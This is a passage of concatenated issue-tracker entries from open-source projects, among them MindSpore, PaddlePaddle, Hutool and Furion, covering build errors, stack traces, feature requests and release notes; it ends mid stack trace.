mindspore/ccsrc/backend/kernel_compiler/CMakeFiles/_mindspore_backend_kernel_compiler_obj.dir/cpu/sparse_apply_lazy_adam_cpu_kernel.cc.o [ 50%] Building CXX object mindspore/ccsrc/pipeline/jit/CMakeFiles/_mindspore_pipeline_jit_obj.dir/static_analysis/program_specialize.cc.o [ 50%] Building CXX object mindspore/ccsrc/frontend/parallel/CMakeFiles/_mindspore_frontend_parallel_obj.dir/ops_info/unique_info.cc.o [ 50%] Building CXX object mindspore/ccsrc/backend/kernel_compiler/CMakeFiles/_mindspore_backend_kernel_compiler_obj.dir/cpu/sparse_apply_proximal_adagrad_cpu_kernel.cc.o [ 50%] Building CXX object mindspore/ccsrc/pipeline/jit/CMakeFiles/_mindspore_pipeline_jit_obj.dir/static_analysis/static_analysis.cc.o [ 50%] Building CXX object mindspore/ccsrc/frontend/parallel/CMakeFiles/_mindspore_frontend_parallel_obj.dir/ops_info/unsorted_segment_op_info.cc.o [ 50%] Building CXX object mindspore/ccsrc/backend/kernel_compiler/CMakeFiles/_mindspore_backend_kernel_compiler_obj.dir/cpu/sparse_tensor_dense_matmul_cpu_kernel.cc.o [ 50%] Building CXX object mindspore/ccsrc/frontend/parallel/CMakeFiles/_mindspore_frontend_parallel_obj.dir/ops_info/virtual_dataset_info.cc.o [ 50%] Building CXX object mindspore/ccsrc/pipeline/jit/CMakeFiles/_mindspore_pipeline_jit_obj.dir/validator.cc.o [ 50%] Building CXX object mindspore/ccsrc/backend/kernel_compiler/CMakeFiles/_mindspore_backend_kernel_compiler_obj.dir/cpu/sparse_to_dense_cpu_kernal.cc.o /data/luopengting/workspace/mindspore/mindspore/ccsrc/backend/kernel_compiler/cpu/sparse_to_dense_cpu_kernal.cc: In instantiation of ‘bool mindspore::kernel::SparseToDenseCPUKernel&lt;I, T&gt;::Launch(const std::vector&lt;std::shared_ptr&lt;mindspore::kernel::Address&gt; &gt;&amp;, const std::vector&lt;std::shared_ptr&lt;mindspore::kernel::Address&gt; &gt;&amp;, const std::vector&lt;std::shared_ptr&lt;mindspore::kernel::Address&gt; &gt;&amp;) [with I = long int; T = Eigen::half]’: /data/luopengting/workspace/mindspore/mindspore/ccsrc/backend/kernel_compiler/cpu/sparse_to_dense_cpu_kernal.h:35:8: required from here /data/luopengting/workspace/mindspore/mindspore/ccsrc/backend/kernel_compiler/cpu/sparse_to_dense_cpu_kernal.cc:55:9: error: ‘void* memset(void*, int, size_t)’ clearing an object of type ‘struct Eigen::half’ with no trivial copy-assignment; use assignment or value-initialization instead [-Werror=class-memaccess] 55 | memset(output_addr, 0, output_len * sizeof(T)); | ~~~~~~^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ In file included from /data/luopengting/workspace/mindspore/.mslib/eigen3_7c811c289376779282be6059f44b3465/include/eigen3/Eigen/Core:411, from /data/luopengting/workspace/mindspore/mindspore/core/base/float16.h:28, from /data/luopengting/workspace/mindspore/mindspore/core/ir/tensor.h:30, from /data/luopengting/workspace/mindspore/mindspore/ccsrc/backend/kernel_compiler/kernel.h:25, from /data/luopengting/workspace/mindspore/mindspore/ccsrc/backend/kernel_compiler/cpu/cpu_kernel.h:24, from /data/luopengting/workspace/mindspore/mindspore/ccsrc/backend/kernel_compiler/cpu/sparse_to_dense_cpu_kernal.h:22, from /data/luopengting/workspace/mindspore/mindspore/ccsrc/backend/kernel_compiler/cpu/sparse_to_dense_cpu_kernal.cc:17: /data/luopengting/workspace/mindspore/.mslib/eigen3_7c811c289376779282be6059f44b3465/include/eigen3/Eigen/src/Core/arch/CUDA/Half.h:80:8: note: ‘struct Eigen::half’ declared here 80 | struct half : public half_impl::half_base { | ^~~~ /data/luopengting/workspace/mindspore/mindspore/ccsrc/backend/kernel_compiler/cpu/sparse_to_dense_cpu_kernal.cc: In instantiation of ‘bool mindspore::kernel::SparseToDenseCPUKernel&lt;I, T&gt;::Launch(const std::vector&lt;std::shared_ptr&lt;mindspore::kernel::Address&gt; &gt;&amp;, const std::vector&lt;std::shared_ptr&lt;mindspore::kernel::Address&gt; &gt;&amp;, const std::vector&lt;std::shared_ptr&lt;mindspore::kernel::Address&gt; &gt;&amp;) [with I = int; T = Eigen::half]’: /data/luopengting/workspace/mindspore/mindspore/ccsrc/backend/kernel_compiler/cpu/sparse_to_dense_cpu_kernal.h:35:8: required from here /data/luopengting/workspace/mindspore/mindspore/ccsrc/backend/kernel_compiler/cpu/sparse_to_dense_cpu_kernal.cc:55:9: error: ‘void* memset(void*, int, size_t)’ clearing an object of type ‘struct Eigen::half’ with no trivial copy-assignment; use assignment or value-initialization instead [-Werror=class-memaccess] 55 | memset(output_addr, 0, output_len * sizeof(T)); | ~~~~~~^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ In file included from /data/luopengting/workspace/mindspore/.mslib/eigen3_7c811c289376779282be6059f44b3465/include/eigen3/Eigen/Core:411, from /data/luopengting/workspace/mindspore/mindspore/core/base/float16.h:28, from /data/luopengting/workspace/mindspore/mindspore/core/ir/tensor.h:30, from /data/luopengting/workspace/mindspore/mindspore/ccsrc/backend/kernel_compiler/kernel.h:25, from /data/luopengting/workspace/mindspore/mindspore/ccsrc/backend/kernel_compiler/cpu/cpu_kernel.h:24, from /data/luopengting/workspace/mindspore/mindspore/ccsrc/backend/kernel_compiler/cpu/sparse_to_dense_cpu_kernal.h:22, from /data/luopengting/workspace/mindspore/mindspore/ccsrc/backend/kernel_compiler/cpu/sparse_to_dense_cpu_kernal.cc:17: /data/luopengting/workspace/mindspore/.mslib/eigen3_7c811c289376779282be6059f44b3465/include/eigen3/Eigen/src/Core/arch/CUDA/Half.h:80:8: note: ‘struct Eigen::half’ declared here 80 | struct half : public half_impl::half_base { | ^~~~ [ 50%] Built target _mindspore_pipeline_jit_obj [ 50%] Building CXX object mindspore/ccsrc/backend/kernel_compiler/CMakeFiles/_mindspore_backend_kernel_compiler_obj.dir/cpu/split_cpu_kernel.cc.o [ 50%] Building CXX object mindspore/ccsrc/frontend/parallel/CMakeFiles/_mindspore_frontend_parallel_obj.dir/parallel_stub/executor_manager_stub.cc.o [ 50%] Building CXX object mindspore/ccsrc/frontend/parallel/CMakeFiles/_mindspore_frontend_parallel_obj.dir/pipeline_transformer/pipeline_transformer.cc.o cc1plus: all warnings being treated as errors make[2]: *** [mindspore/ccsrc/backend/kernel_compiler/CMakeFiles/_mindspore_backend_kernel_compiler_obj.dir/build.make:1441: mindspore/ccsrc/backend/kernel_compiler/CMakeFiles/_mindspore_backend_kernel_compiler_obj.dir/cpu/sparse_to_dense_cpu_kernal.cc.o] Error 1 make[2]: *** Waiting for unfinished jobs.... [ 50%] Building CXX object mindspore/ccsrc/frontend/parallel/CMakeFiles/_mindspore_frontend_parallel_obj.dir/step_auto_parallel.cc.o make[1]: *** [CMakeFiles/Makefile2:551: mindspore/ccsrc/backend/kernel_compiler/CMakeFiles/_mindspore_backend_kernel_compiler_obj.dir/all] Error 2 make[1]: *** Waiting for unfinished jobs.... [ 50%] Building CXX object mindspore/ccsrc/frontend/parallel/CMakeFiles/_mindspore_frontend_parallel_obj.dir/step_parallel.cc.o [ 50%] Building CXX object mindspore/ccsrc/frontend/parallel/CMakeFiles/_mindspore_frontend_parallel_obj.dir/strategy_checkpoint/parallel_strategy_checkpoint.cc.o [ 50%] Building CXX object mindspore/ccsrc/frontend/parallel/CMakeFiles/_mindspore_frontend_parallel_obj.dir/tensor_layout/arrangement.cc.o [ 50%] Building CXX object mindspore/ccsrc/frontend/parallel/CMakeFiles/_mindspore_frontend_parallel_obj.dir/tensor_layout/array.cc.o [ 50%] Building CXX object mindspore/ccsrc/frontend/parallel/CMakeFiles/_mindspore_frontend_parallel_obj.dir/tensor_layout/construct_operator.cc.o [ 50%] Building CXX object mindspore/ccsrc/frontend/parallel/CMakeFiles/_mindspore_frontend_parallel_obj.dir/tensor_layout/layout_transfer.cc.o [ 50%] Building CXX object mindspore/ccsrc/frontend/parallel/CMakeFiles/_mindspore_frontend_parallel_obj.dir/tensor_layout/map.cc.o [ 50%] Building CXX object mindspore/ccsrc/frontend/parallel/CMakeFiles/_mindspore_frontend_parallel_obj.dir/tensor_layout/redistribution_layout_transfer.cc.o [ 50%] Building CXX object mindspore/ccsrc/frontend/parallel/CMakeFiles/_mindspore_frontend_parallel_obj.dir/tensor_layout/redistribution_operator_infer.cc.o [ 51%] Building CXX object mindspore/ccsrc/frontend/parallel/CMakeFiles/_mindspore_frontend_parallel_obj.dir/tensor_layout/reshape_layout_transfer.cc.o [ 51%] Building CXX object mindspore/ccsrc/frontend/parallel/CMakeFiles/_mindspore_frontend_parallel_obj.dir/tensor_layout/shape_util.cc.o [ 51%] Building CXX object mindspore/ccsrc/frontend/parallel/CMakeFiles/_mindspore_frontend_parallel_obj.dir/tensor_layout/tensor_layout.cc.o [ 51%] Building CXX object mindspore/ccsrc/frontend/parallel/CMakeFiles/_mindspore_frontend_parallel_obj.dir/tensor_layout/tensor_redistribution.cc.o [ 51%] Built target _mindspore_frontend_parallel_obj make: *** [Makefile:152: all] Error 2 cc1plus: all warnings being treated as errors"
用户自定义词典更新问题,版本号： v2.2.0 问题背景：在es插件中，已经实现了自定义词典，比如自定义词典名称为lex-mylexicon.lex，比如该词典中原来存在词条如下： 现在需要将最后一个词条移除，当词条文件移除后，发现还是可以得到该分词结果，请问这个情况jc有处理方案吗？   <code>: CJK_WORD 民间乒乓第一高手/null/min jian ping pang di yi gao shou/null 业余乒乓第一高手/null/ye yv ping pang di yi gao shou/null 我是省队高手/null/wo shi sheng dui gao shou/null
希望聚合查询支持指定嵌套类型的字段,"看了文档，没有发现支持指定嵌套类型的字段的聚合查询 希望能有这样的功能   <code>: EsWrappers.lambdaQuery(Document.class) .nestedGroupBy(Document::getUsers, FieldUtils.val(User::getUsername), ""用户1"");"
form-builder编辑问题,"列表编辑记录$this-&gt;builder-&gt;select第三个参数设置默认值没有生效 例如：   <code>: //位置app\services\system\admin\SystemAdminServices $this-&gt;builder-&gt;select('roles', '管理员身份', $formData['roles'] ?? [])"
【Version 2.1.4 2019.3】Mysql连接失败（The server time zone value '???ú±ê×??±??' is unrecognized or represents more than one time zone.）,软件版本： 错误日志：   <code>: Version 2.1.4 2019.3 2019-03-14 08:52:29.236 [main] INFO group.rober.pdman.dbconnector.Application - ======================================================================================== 2019-03-14 08:52:29.238 [main] INFO group.rober.pdman.dbconnector.Application - 执行命令:ping driver_class_name=com.mysql.jdbc.Driver url=jdbc:mysql://127.0.0.1:3306/xmall?characterEncoding=UTF-8&amp;useSSL=false&amp;useUnicode=true username=root password=admin123 2019-03-14 08:52:29.238 [main] INFO group.rober.pdman.dbconnector.Application - ======================================================================================== 2019-03-14 08:52:29.393 [main] WARN group.rober.pdman.command.impl.PingDBCommand - java.sql.SQLException: The server time zone value '???ú±ê×??±??' is unrecognized or represents more than one time zone. You must configure either the server or JDBC driver (via the serverTimezone configuration property) to use a more specifc time zone value if you want to utilize time zone support. at com.mysql.cj.jdbc.exceptions.SQLError.createSQLException(SQLError.java:129) at com.mysql.cj.jdbc.exceptions.SQLError.createSQLException(SQLError.java:97) at com.mysql.cj.jdbc.exceptions.SQLError.createSQLException(SQLError.java:89) at com.mysql.cj.jdbc.exceptions.SQLError.createSQLException(SQLError.java:63) at com.mysql.cj.jdbc.exceptions.SQLError.createSQLException(SQLError.java:73) at com.mysql.cj.jdbc.exceptions.SQLExceptionsMapping.translateException(SQLExceptionsMapping.java:76) at com.mysql.cj.jdbc.ConnectionImpl.createNewIO(ConnectionImpl.java:835) at com.mysql.cj.jdbc.ConnectionImpl.&lt;init&gt;(ConnectionImpl.java:455) at com.mysql.cj.jdbc.ConnectionImpl.getInstance(ConnectionImpl.java:240) at com.mysql.cj.jdbc.NonRegisteringDriver.connect(NonRegisteringDriver.java:207) at java.sql.DriverManager.getConnection(DriverManager.java:664) at java.sql.DriverManager.getConnection(DriverManager.java:247) at group.rober.pdman.command.impl.PingDBCommand.exec(PingDBCommand.java:34) at group.rober.pdman.command.impl.PingDBCommand.exec(PingDBCommand.java:16) at group.rober.pdman.dbconnector.Application.main(Application.java:75) Caused by: com.mysql.cj.exceptions.InvalidConnectionAttributeException: The server time zone value '???ú±ê×??±??' is unrecognized or represents more than one time zone. You must configure either the server or JDBC driver (via the serverTimezone configuration property) to use a more specifc time zone value if you want to utilize time zone support. at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62) at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45) at java.lang.reflect.Constructor.newInstance(Constructor.java:423) at com.mysql.cj.exceptions.ExceptionFactory.createException(ExceptionFactory.java:61) at com.mysql.cj.exceptions.ExceptionFactory.createException(ExceptionFactory.java:85) at com.mysql.cj.util.TimeUtil.getCanonicalTimezone(TimeUtil.java:132) at com.mysql.cj.protocol.a.NativeProtocol.configureTimezone(NativeProtocol.java:2234) at com.mysql.cj.protocol.a.NativeProtocol.initServerSession(NativeProtocol.java:2258) at com.mysql.cj.jdbc.ConnectionImpl.initializePropsFromServer(ConnectionImpl.java:1319) at com.mysql.cj.jdbc.ConnectionImpl.connectOneTryOnly(ConnectionImpl.java:966) at com.mysql.cj.jdbc.ConnectionImpl.createNewIO(ConnectionImpl.java:825) ... 8 common frames omitted
Program clone is mutating the Program to be cloned,Clone ProgramDesc   <code>: other
Toast 组件增加全局配置项设置弹窗位置,"Toast 组件增加全局配置项设置弹窗位置，默认位置 默认为 null 当设置值后覆盖整站设置   <code>: ""BootstrapBlazorOptions"": { ""ToastDelay"": 4000, ""ToastPlacement"": ""TopEnd"" }"
dynamic-datasource-spring-boot-starter抛出dbType not support解决,"不支持导致的，将配置文件中的缓存、sql防火墙等功能关闭掉，问题解决。   <code>: # 打开PSCache，并且指定每个连接上PSCache的大小（防火墙这一块一定不能开，sqlite不支持，会导致奇怪的异常） spring.datasource.poolPreparedStatements=true spring.datasource.maxPoolPreparedStatementPerConnectionSize=20 # 配置监控统计拦截的filters，去掉后监控界面sql无法统计，'wall'用于防火墙去掉 spring.datasource.filters=stat,log4j # 通过connectProperties属性来打开mergeSql功能；慢SQL记录 spring.datasource.connectionProperties=druid.stat.mergeSql=true;druid.stat.slowSqlMillis=5000 # 合并多个DruidDataSource的监控数据 spring.datasource.useGlobalDataSourceStat=true"
【bug反馈】1.11.0这个版本发现一个bug,"数据集中写了一个类似与这样的sql： sql在数据集中执行预览都没问题 然后去建一个图表，我选择的是基本柱状图，但是在添加了这个创建的数据集之后出现了四个字段： 展示为： username count(*) 用户名 案例数量 如图： 然后不管怎么保存展示都不行了。 后来多次尝试也不行，好像有缓存似的，即便是删掉了select后的别名，还是为展示出来之前的别名。 最后我尝试降级到1.10.1这个版本，应该是不能向下兼容了，之间数据集查不到了，之前的看板也不能展示了。 希望大佬尽快帮忙解决一下。   <code>: select userName 用户名,count(*) 案例数量 from xxx where ..."
[MS][RDR] fix ci warning about RDR,Task Use this template for task tracking kind/task Task Description Use for member functions that do not modify member variables. Use the keyword when overriding virtual functions. Task Goal Sub Task NA   <code>: const override
 发布 Furion v4.6.9 版本,"发布 和 和 版本 包含以下功能更新： 功能清单 修复远程请求没有正确处理 类型的 参数 <sup>4.6.9</sup> #I5XIQ4:远程请求中使用 IEnumerable 相关类型的参数出现问题 修复自定义 实体且包含 属性且没有继承 基类出现 <sup>4.6.9</sup> #I4UM3E:EFCore，自定义Entity包含属性：租户Id【TenantId】，使用EFCore出现异常 更新 拓展和脚手架至 版本 发布 版本文档 更新示例项目 依赖至 版本 Replit 网站 案例同步到 版本 和 发布 版本 同步更新日志 !631: 发布 Furion v4.6.9 版本 a1c6ee8 14dddab ad81f3e 文档更新 1. 实现 执行方式 默认情况下，定时任务都是采用 的方式，也就是不会等待上一次任务完成，如果需要等待上一次任务完成，可以修改为 方式：   <code>: Furion Furion.Tools Furion.Xunit v4.6.9 数组和集合 url Tenant TenantId EntityBase/Entity The entity type 'Tenant' requires a primary key to be defined SqlSugarCore 5.1.3.28 v4.6.9 samples v4.6.9 Furion v4.6.9 Gitee Github Release-v4.6.9 Worker Service 串行 并行 串行 using Furion.TimeCrontab; namespace WorkerService; public class Worker : BackgroundService { private readonly ILogger&lt;Worker&gt; _logger; private readonly Crontab _crontab; private bool _isLock = false; public Worker(ILogger&lt;Worker&gt; logger) { _logger = logger; _crontab = Crontab.Parse(""* * * * * *"", CronStringFormat.WithSeconds); } protected override async Task ExecuteAsync(CancellationToken stoppingToken) { while (!stoppingToken.IsCancellationRequested) { if (_isLock) goto next; _isLock = true; var taskFactory = new TaskFactory(System.Threading.Tasks.TaskScheduler.Current); var task = await taskFactory.StartNew(async () =&gt; { // 模拟耗时操作 await Task.Delay(2000); _logger.LogInformation(""Worker running at: {time}"", DateTimeOffset.Now); await Task.CompletedTask; }, stoppingToken); // 等待任务完成 await task.ContinueWith(task =&gt; _isLock = false); next: await Task.Delay(_crontab.GetSleepMilliseconds(DateTime.UtcNow), stoppingToken); } } }"
文档中关于安装BootstrapBlazor.Markdown包的错误,文档中关于安装包的错误：   <code>: BootstrapBlazor.Markdown
Tensor::__setitem__ 在动态shape时执行报错,"/ 硬件环境: ascend/GPU/CPU : -- MindSpore version : 2.0.0 -- Python version : 3.7.5 -- OS platform and distribution : ubuntu 18.04 -- GCC/Compiler version : NA (/): mode graph 执行上述用例 经过阅读源码，前端在解析setitem操作是，生成step数据错误。   <code>: import numpy as np import mindspore from mindspore import nn, context, Parameter, Tensor class Net(nn.Cell): def __init__(self): super(Net, self).__init__() self.share_obs = Parameter(np.zeros((100, 5), dtype=np.float32), requires_grad=False) def construct(self, start, end): return self.share_obs[start:end] start = Tensor([0], mindspore.int32) end = Tensor([10], mindspore.int32) context.set_context(mode=context.GRAPH_MODE) net = Net() ret = net(start, end) raise ValueError(f""For '{self.name}', both the 'begins', 'ends', and 'strides' must be 1-D, "" ValueError: For 'StridedSlice', both the 'begins', 'ends', and 'strides' must be 1-D, but got 'begin' shape: [1, 1]."
换个机器训练报错,"一模一样的代码之前一直能跑的，换了个机器跑，结果报错了。错误信息不明确指向的代码，或者是什么错误。   <code>: /root/chenliangyu/bin/paddle_1.6.0_py2.7/lib/python2.7/site-packages/paddle/fluid/executor.py:774: UserWarning: The following exception is not an EOF exception. ""The following exception is not an EOF exception."") Traceback (most recent call last): File ""./run_seq2seq.py"", line 363, in &lt;module&gt; main(args) File ""./run_seq2seq.py"", line 279, in main train_exe.run(fetch_list=[]) File ""/root/chenliangyu/bin/paddle_1.6.0_py2.7/lib/python2.7/site-packages/paddle/fluid/parallel_executor.py"", line 311, in run return_numpy=return_numpy) File ""/root/chenliangyu/bin/paddle_1.6.0_py2.7/lib/python2.7/site-packages/paddle/fluid/executor.py"", line 775, in run six.reraise(*sys.exc_info()) File ""/root/chenliangyu/bin/paddle_1.6.0_py2.7/lib/python2.7/site-packages/paddle/fluid/executor.py"", line 770, in run use_program_cache=use_program_cache) File ""/root/chenliangyu/bin/paddle_1.6.0_py2.7/lib/python2.7/site-packages/paddle/fluid/executor.py"", line 829, in _run_impl return_numpy=return_numpy) File ""/root/chenliangyu/bin/paddle_1.6.0_py2.7/lib/python2.7/site-packages/paddle/fluid/executor.py"", line 669, in _run_parallel tensors = exe.run(fetch_var_names)._move_to_list() paddle.fluid.core_avx.EnforceNotMet: -------------------------------------------- C++ Call Stacks (More useful to developers): -------------------------------------------- 0 std::string paddle::platform::GetTraceBackString&lt;char const*&gt;(char const*&amp;&amp;, char const*, int) 1 paddle::platform::EnforceNotMet::EnforceNotMet(std::__exception_ptr::exception_ptr, char const*, int) 2 paddle::framework::OperatorWithKernel::ParseInputDataType(paddle::framework::ExecutionContext const&amp;, std::string const&amp;, paddle::framework::proto::VarType_Type*) const 3 paddle::framework::OperatorWithKernel::IndicateDataType(paddle::framework::ExecutionContext const&amp;) const 4 paddle::framework::OperatorWithKernel::GetExpectedKernelType(paddle::framework::ExecutionContext const&amp;) const 5 paddle::framework::OperatorWithKernel::ChooseKernel(paddle::framework::RuntimeContext const&amp;, paddle::framework::Scope const&amp;, boost::variant&lt;paddle::platform::CUDAPlace, paddle::platform::CPUPlace, paddle::platform::CUDAPinnedPlace, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_&gt; const&amp;) const 6 paddle::framework::OperatorWithKernel::RunImpl(paddle::framework::Scope const&amp;, boost::variant&lt;paddle::platform::CUDAPlace, paddle::platform::CPUPlace, paddle::platform::CUDAPinnedPlace, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_&gt; const&amp;, paddle::framework::RuntimeContext*) const 7 paddle::framework::OperatorWithKernel::RunImpl(paddle::framework::Scope const&amp;, boost::variant&lt;paddle::platform::CUDAPlace, paddle::platform::CPUPlace, paddle::platform::CUDAPinnedPlace, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_&gt; const&amp;) const 8 paddle::framework::OperatorBase::Run(paddle::framework::Scope const&amp;, boost::variant&lt;paddle::platform::CUDAPlace, paddle::platform::CPUPlace, paddle::platform::CUDAPinnedPlace, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_&gt; const&amp;) 9 paddle::framework::details::ScopeBufferedSSAGraphExecutor::InitVariables() 10 paddle::framework::details::ScopeBufferedSSAGraphExecutor::Run(std::vector&lt;std::string, std::allocator&lt;std::string&gt; &gt; const&amp;) 11 paddle::framework::ParallelExecutor::Run(std::vector&lt;std::string, std::allocator&lt;std::string&gt; &gt; const&amp;) ---------------------- Error Message Summary: ---------------------- PaddleCheckError: The DataType of coalesce_tensor Op's duplicable Variable Input must be consistent. The current variable type is (::paddle::platform::float16), but the previous variable type is (float). at [/paddle/paddle/fluid/framework/operator.cc:1173]"
@Excel 导出实体类中嵌套的另一实体类中多个参数,在导出A的时候，如何将b的两个属性也导出。targetAttr 只能设置一个值啊   <code>: A{ String name; B b;} B{ int age; String addr;}
"用hutool5,AES解密文件数据失败，请官方大看看怎么回事","JDK版本： 官方jdk1.8.0_251 hutool版本： 5.7.3 和其他公司对接数据，他们用了aes方式加密了数据，我们需要用aes方式解密数据，我用了hutool的AES类来解密数据，在解密数据时，有的数据能解密成功，有的解密不成功，下面放一张能解密成功的图： 2. 堆栈信息 <ol start=""3""> 文件内容传不上去，请联系我的Q:365167092,谢谢官方大大   <code>: @Test public void test8() throws NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException, IOException { BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(new FileInputStream(""D:\\21061101\\20221028\\21061101_fileNum_20221028_001.txt""))); String line = """"; AES aes = new AES(Mode.CBC, Padding.PKCS5Padding,KEY.getBytes(),IV.getBytes()); if((line = bufferedReader.readLine()) != null){ byte[] decrypt = aes.decrypt(line); System.out.println(new String(decrypt)); } bufferedReader.close(); } cn.hutool.crypto.CryptoException: BadPaddingException: pad block corrupted at cn.hutool.crypto.symmetric.SymmetricCrypto.decrypt(SymmetricCrypto.java:463) at io.renren.DecryptTest2.test8(DecryptTest2.java:120) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:50) at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12) at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:47) at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17) at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:325) at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:78) at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:57) at org.junit.runners.ParentRunner$3.run(ParentRunner.java:290) at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:71) at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:288) at org.junit.runners.ParentRunner.access$000(ParentRunner.java:58) at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:268) at org.junit.runners.ParentRunner.run(ParentRunner.java:363) at org.junit.runner.JUnitCore.run(JUnitCore.java:137) at com.intellij.junit4.JUnit4IdeaTestRunner.startRunnerWithArgs(JUnit4IdeaTestRunner.java:68) at com.intellij.rt.junit.IdeaTestRunner$Repeater.startRunnerWithArgs(IdeaTestRunner.java:33) at com.intellij.rt.junit.JUnitStarter.prepareStreamsAndStart(JUnitStarter.java:230) at com.intellij.rt.junit.JUnitStarter.main(JUnitStarter.java:58) Caused by: javax.crypto.BadPaddingException: pad block corrupted at org.bouncycastle.jcajce.provider.symmetric.util.BaseBlockCipher$BufferedGenericBlockCipher.doFinal(Unknown Source) at org.bouncycastle.jcajce.provider.symmetric.util.BaseBlockCipher.engineDoFinal(Unknown Source) at javax.crypto.Cipher.doFinal(Cipher.java:2168) at cn.hutool.crypto.symmetric.SymmetricCrypto.decrypt(SymmetricCrypto.java:461) ... 23 more"
Consider adding a PADDLE_INFERENCE option and a PADDLE_MOBILE macro,"At present, when we do model inference in the mobile environment, hoping the paddle can be small enough. So, when compiling the paddle for the mobile environment (Android, IOS), we need to be able to crop the paddle modules, thereby reducing the size of the inference program. Based on the previous survey #1845:Refactor the ways to build docker image, we found several modules (like libpaddle_pserver.a, libpaddle_trainer_lib.a, libpaddle_api.a and so on) that were not related to inference, which took some volume in the final inference program. So, consider adding a switch to do module clipping at the compile time. At present, in some of the CMakeLists.txt files have been used done something like that. Further work is replacing with and needs to refine the CMakeLists.txt files for the modules clipping.   <code>: PADDLE_INFERENCE WITH_C_API WITH_C_API PADDLE_INFERENCE"
test fail with cpu only,issue how to reproduce   <code>: make test Running tests... Test project /home/tangjian/paddle-tj/build Start 1: malloc_test 1/310 Test #1: malloc_test .....................................***Failed 0.01 sec Start 2: system_allocator_test 2/310 Test #2: system_allocator_test ...........................***Failed 0.01 sec Start 3: enforce_test 3/310 Test #3: enforce_test ....................................***Failed 0.01 sec Start 4: cpu_info_test 4/310 Test #4: cpu_info_test ...................................***Failed 0.01 sec Start 5: place_test 5/310 Test #5: place_test ......................................***Failed 0.01 sec Start 6: profiler_test 6/310 Test #6: profiler_test ...................................***Failed 0.01 sec Start 7: float16_test 7/310 Test #7: float16_test ....................................***Failed 0.01 sec Start 8: ddim_test 8/310 Test #8: ddim_test .......................................***Failed 0.01 sec Start 9: tensor_test 9/310 Test #9: tensor_test .....................................***Failed 0.01 sec Start 10: tensor_util_test 10/310 Test #10: tensor_util_test ................................***Failed 0.01 sec Start 11: eigen_test 11/310 Test #11: eigen_test ......................................***Failed 0.01 sec Start 12: lod_tensor_test 12/310 Test #12: lod_tensor_test .................................***Failed 0.01 sec Start 13: variable_test 13/310 Test #13: variable_test ...................................***Failed 0.01 sec ... cmake .. -DWITH_GPU=OFF -DWITH_FLUID_ONLY=ON -DWITH_TESTING=ON make -j make test
BigExcelWriter.flush异常,使用的JDK版本和Hutool版本 5.1.0   <code>: org.apache.poi.ooxml.POIXMLException: java.io.EOFException: Unexpected end of ZLIB input stream at org.apache.poi.ooxml.POIXMLDocument.getProperties(POIXMLDocument.java:147) at org.apache.poi.ooxml.POIXMLDocument.write(POIXMLDocument.java:240) at org.apache.poi.xssf.streaming.SXSSFWorkbook.write(SXSSFWorkbook.java:953) at cn.hutool.poi.excel.ExcelWriter.flush(ExcelWriter.java:971) at cn.hutool.poi.excel.ExcelWriter.flush(ExcelWriter.java:945) at cn.hutool.poi.excel.ExcelWriter.flush(ExcelWriter.java:931) at com.wd.cloud.journalserver.service.impl.BatchServiceImpl.readFileBySax(BatchServiceImpl.java:110) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:343) at 